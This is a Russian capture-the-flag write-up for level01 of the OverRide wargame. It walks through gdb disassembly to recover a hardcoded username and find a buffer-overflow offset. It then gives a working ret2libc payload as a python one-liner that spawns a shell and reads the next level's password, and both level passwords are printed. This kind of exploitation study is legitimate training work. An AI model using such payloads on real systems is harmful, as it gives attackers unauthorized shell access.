[back](../defense.md)

su level01

Password: uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL

В этом уровне программа level01 просит ввести имя пользователя:

```
level01@OverRide:~$ ./level01
	********* ADMIN LOGIN PROMPT *********
	Enter Username: qwe
	verifying username....

	nope, incorrect username...

gdb level01
(gdb) disas main
```

Среди прочих, есть интресная строка
```
0x0804852d <+93>:	call   0x8048464 <verify_user_name>
```
Смотрим, что в ней.

Видим там команду сравнения регистров edi & esi с пересылками перд ними.
```
0x08048478 <+20>:	mov    $0x804a040,%edx
0x0804847d <+25>:	mov    $0x80486a8,%eax
0x08048482 <+30>:	mov    $0x7,%ecx
0x08048487 <+35>:	mov    %edx,%esi
0x08048489 <+37>:	mov    %eax,%edi
0x0804848b <+39>:	repz cmpsb %es:(%edi),%ds:(%esi)
```

В регистр edi идет пересылка с регистра eax, куда записывается значение с адреса 0x80486a8

А в регистр esi идет пересылка с регистра edx, куда записывается значение с адреса 0x804a040

Пройдясь по адресам видим, что по одному адресу лежит имя пользователя, а во втором то, что мы вводим:

```
(gdb) x/s 0x804a040
	0x804a040 <a_user_name>:	 ""

(gdb) x/s 0x80486a8
	0x80486a8:	 "dat_wil"
```

Соответственно dat_wil это имя пользователя.

Осталось добыть пароль

Предварительно создаем последовательность переполнения буфера

```
(gdb) r
	Starting program: /home/users/level01/level01
	********* ADMIN LOGIN PROMPT *********
	Enter Username: dat_wil
	verifying username....
	Enter Password:
	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
	nope, incorrect password...
	Program received signal SIGSEGV, Segmentation fault.
	0x37634136 in ?? ()
```

и подставляем значение https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

```
	EIP Value: 
	0x37634136
	Offset:
	80
	(Bytes are in reverse order. ex 0xDEADBEEF is showing as 0xEFBEADDE)
```

Ищем, где лежит /bin/sh
```
(gdb) info proc map
	process 2840
	Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
	0xf7e2b000 0xf7e2c000     0x1000        0x0
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0
	0xf7fd8000 0xf7fdb000     0x3000        0x0
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]

(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
	0xf7f897ec
	1 pattern found.

(gdb) x/s 0xf7f897ec
	0xf7f897ec:	 "/bin/sh"
```

Ищем системную функцию:
```
(gdb) i func system
	All functions matching regular expression "system":
	Non-debugging symbols:
	0xf7e6aed0  __libc_system
	0xf7e6aed0  system
	0xf7f48a50  svcerr_systemerr

(gdb) i func exit
	0xf7e5eb70  exit
```

"A"*80 - смещение

0xf7e6aed0  system

0xf7e5eb70  exit

0xf7f897ec:	 "/bin/sh"

```
(gdb) q
	y

level01@OverRide:~$ (python -c 'print "dat_wil\n"+"B"*80+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"'; cat) | ./level01
	********* ADMIN LOGIN PROMPT *********
	Enter Username: verifying username....
	Enter Password:
	nope, incorrect password...

whoami
	level02

cd /home/users/level02
ls -la
cat .pass
	Password: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
exit
su level02
Password: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
	RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
	No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
```

Уровень пройден.

[back](../defense.md)
